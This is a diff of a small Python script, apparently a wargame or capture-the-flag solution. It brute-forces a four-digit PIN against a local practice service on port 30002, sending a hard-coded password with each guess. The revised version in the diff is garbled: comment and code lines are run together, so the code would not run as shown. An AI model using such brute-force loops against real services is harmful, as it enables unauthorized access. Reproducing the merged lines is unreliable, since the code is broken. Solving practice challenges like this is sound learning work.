@@ -1,29 +1,25 @@
-#!/usr/bin/python3
-import sys
+#!/usr/bin/env python3
+# coding: utf-8import sys
 import socket
+import sys
 
 pincode = 0
-password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
-
-try:
-    #connect to server
-    s = socket.socket(socket.AF_INET, socket.STREAM)
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"try:
+    # Connect to server
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("127.0.0.1", 30002))
-
-    #print welcome message
-    Welcome_msg = s.recv(2048)
-    print(Welcome_msg)
-
-    #try bruteforcing
+    
+    # Print welcome message
+    welcome_msg = s.recv(2048)
+    print(welcome_msg)    
+    # Try brute-forcing
     while pincode < 10000:
         pincode_string = str(pincode).zfill(4)
-        message = password+" "+pincode_string+"\n"
-
-        #send message
+        message=password+" "+pincode_string+"\n"        
+        # Send message
         s.sendall(message.encode())
-        receive_msg = s.recv(1024)
-
-        #check result
+        receive_msg = s.recv(1024)        
+        # Check result
         if "Wrong" in receive_msg:
             print("Wrong PINCODE: %s" % pincode_string)
         else:
